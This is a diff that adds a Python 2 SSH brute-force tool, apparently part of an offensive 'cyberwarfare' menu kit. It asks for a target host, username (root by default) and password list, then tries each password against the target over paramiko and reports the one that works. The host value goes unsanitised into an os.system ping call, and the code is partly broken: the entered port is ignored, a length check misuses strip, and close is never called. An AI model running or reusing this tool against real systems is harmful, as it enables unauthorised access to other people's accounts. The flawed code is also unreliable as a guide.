@@ -1,0 +1,139 @@
+#!/usr/bin/python2
+import paramiko, socket, sys, os, time
+global host, username, passwordlist
+line = "--------------------------------------------------------------------------------"
+
+notrunning = "[*] SSH Bruteforce - Status: NOT RUNNING!\n\n"
+
+def exit():
+  sys.exit(1)
+
+try:
+  while True:
+    os.system('clear')
+    print(notrunning)
+    host = raw_input("[+] Target - Host: ")
+
+    if len(host).strip() == 0:
+      os.system('clear')
+
+    else:
+      print(' ')
+      HOST_STATUS = True if os.system('echo [!] Ensuring Host is online: && ping -c 1 ' + host) is 0 else False
+
+      if HOST_STATUS == False:
+        os.system('clear')
+        print(notrunning)
+        print("[!] ERROR: HOST IS OFFLINE!")
+        time.sleep(3)
+      elif HOST_STATUS == True:
+        break
+
+  while True:
+    os.system('clear')
+    print(notrunning)
+    port = raw_input("[+] Target - Port: ")
+    if len(port) == 0:
+      os.system('clear')
+      print(notrunning)
+      print("[+] Target - Port: 22")
+      port = 22
+      time.sleep(3)
+      break
+    else:
+      port = int(port)
+      break
+
+  while True:
+    os.system('clear')
+    print(notrunning)
+    username = raw_input("[+] Target - Username: ")
+    if len(username) == 0:
+      os.system('clear')
+      print(notrunning)
+      print("[+] Target - Username: root")
+      username = 'root'
+      time.sleep(3)
+      break
+
+    else:
+      break
+
+  while True:
+    os.system('clear')
+    print(notrunning)
+    passwordlist = raw_input("[+] Target - Password List: ")
+    if os.path.exists(passwordlist) == False:
+      print("\n[!] ERROR: INVALID FILE PATH.\n")
+      time.sleep(2)
+      continue
+    else:
+      passwordlist = open(passwordlist)
+      break
+
+  def ssh_connect(password, code = 0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+      ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+      code = 1
+    except socket.gaierror:
+      code = 2
+
+    ssh.close
+    return code
+
+
+  os.system('clear')
+  print("[*] SSH Bruteforce - Status: RUNNING!\n\n")
+  print(line)
+  print("[*] Running Bruteforce Attack Against: %s:22" % host)
+  print(line + "\n")
+  for i in passwordlist:
+    password = i.strip('\n')
+    try:
+      result = ssh_connect(password)
+      if result == 0:
+        print("\n")
+        print(line)
+        print("[!] PASSWORD FOUND: " + password)
+        print(line)
+        raw_input("\nPress (Enter) to return back to main menu (will clear the screen). ")
+        os.system('./CWA')
+
+      elif result == 1:
+        print("[!] Trying: " + password + ". Error: Not the correct password!")
+
+      elif result == 2:
+        print("[!] ERROR: UNABLE TO CONNECT TO: " + host + ":22")
+
+    except KeyboardInterrupt:
+      print("\n\n[!] User Requested a Shutdown... Exiting.")
+      sys.exit(0)
+
+  passwordlist.close
+  sys.exit(1)
+
+except paramiko.ssh_exception.NoValidConnectionsError:
+  while True:
+    os.system('clear')
+    print("[*] SSH Bruteforce - Status: FAILED!\n\n")
+    print("[!] ERROR: UNABLE TO CONNECT TO %s:%s." % (host, port))
+    choice = raw_input("\n[+] Would you like to try again? Y/n?\n\ncyberwarfare-# ")
+    if choice.strip() and choice.lower() == 'y':
+      os.system("./Bruteforce/SSHBruteforce")
+      exit()
+    elif choice.strip() and choice.lower() == 'n':
+      os.system("./CWA")
+      exit() 
+    else:
+      continue
+
+except KeyboardInterrupt:
+  print("\n\n[!] User Requested a Shutdown... Exiting.")
+  sys.exit(0)
+
+passwordlist.close
+sys.exit(1)
